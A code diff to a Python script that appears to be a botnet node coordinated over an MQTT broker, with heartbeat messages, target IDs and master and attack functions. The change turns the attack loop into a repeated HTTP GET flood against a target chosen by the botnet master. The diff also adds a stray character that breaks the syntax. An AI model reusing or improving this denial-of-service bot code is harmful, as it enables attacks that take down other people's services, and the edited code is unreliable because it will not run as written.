@@ -1,5 +1,6 @@
 import paho.mqtt.client as mqtt
 import time
+import requests#import urllib.request
 broker = "iot.eclipse.org"
 port = 1883
 global received,nodeId,lastId,target
@@ -36,7 +37,6 @@ def on_messagesc(client, userdata, msg):
         inp=str(msg.payload)[2:-1].split(" ")
         print("Target/Id",inp[0],inp[1])
         print("My last id",lastId)
-        print(int(inp[1])<int(lastId))
         #topic=str(msg.topic)
         print(" ")
         if(int(inp[1])<int(lastId)):
@@ -68,8 +68,11 @@ def attack():
     startTime=time.time()
     while(True):
         ##get
-        client.loop(.1)
+        print("get")
+        r = requests.get(target)
+        time.sleep(1)
         if(int((time.time()-startTime)%60)==0):
+            client.loop(.1)
             print("Checking")
             if(target=="0"):
                 break
@@ -126,6 +129,7 @@ def master():
             time.sleep(.7)
             ret= client.publish("botnet/heartbeat",heartbeat())            
             print("Last id:",lastId)
+            print("Target:",target)S
             print(ret)
             
 def common():
